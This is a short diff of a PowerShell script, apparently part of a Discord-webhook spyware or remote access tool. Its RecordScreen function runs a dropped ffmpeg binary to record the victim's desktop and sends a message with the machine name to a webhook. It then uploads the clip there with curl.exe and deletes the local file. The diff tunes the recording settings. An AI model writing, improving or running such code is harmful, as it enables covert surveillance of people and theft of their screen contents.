@@ -34,7 +34,8 @@ Function RecordScreen{
     $mkvPath = "$env:Temp\ScreenClip.mkv"
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen (24mb Clip)`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 5 -i desktop -fs 24000000 $mkvPath
+    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 20 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
+    # .$env:Temp\ffmpeg.exe -f gdigrab -framerate 5 -i desktop -fs 24000000 $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
     sleep 1
     rm -Path $mkvPath -Force
